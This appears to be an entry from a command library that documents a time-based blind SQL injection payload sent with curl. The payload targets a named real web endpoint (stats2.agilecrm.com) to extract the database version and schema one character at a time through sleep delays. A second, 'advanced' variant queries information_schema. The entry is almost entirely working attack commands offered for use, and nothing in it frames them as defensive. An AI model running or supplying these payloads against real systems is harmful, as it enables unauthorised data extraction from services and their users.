---
id: cmd-433792-curl-schema
data: >-
  curl
  'https://stats2.agilecrm.com/addstats?new=IF(ASCII(SUBSTRING(@@version,1,1))=53,
  (select*from(select(sleep(5)))a), "normal")'
tags:
  - sqli
  - exfiltration
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:07.737Z'
verified: false
validated: true
submitted: true
---
# curl-schema-extract

## Command

```bash
curl 'https://stats2.agilecrm.com/addstats?new=IF(ASCII(SUBSTRING(@@version,1,1))=53, (select*from(select(sleep(5)))a), "normal")'
```

## Description

Uses conditional Blind SQLi to extract schema info via time delays on true conditions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Payload | Conditional extraction query | Yes |

## Examples

### Basic Usage

```bash
curl 'https://stats2.agilecrm.com/addstats?new=IF(...sleep(5)...)'
```

### Advanced Usage

```bash
curl -w time 'https://stats2.agilecrm.com/addstats?new=IF((SELECT COUNT(*) FROM information_schema.tables)>0, sleep(5), normal)'
```

## Expected Output

Delay on match, allowing character-by-character extraction.

## Related

- [[Related Procedure]]
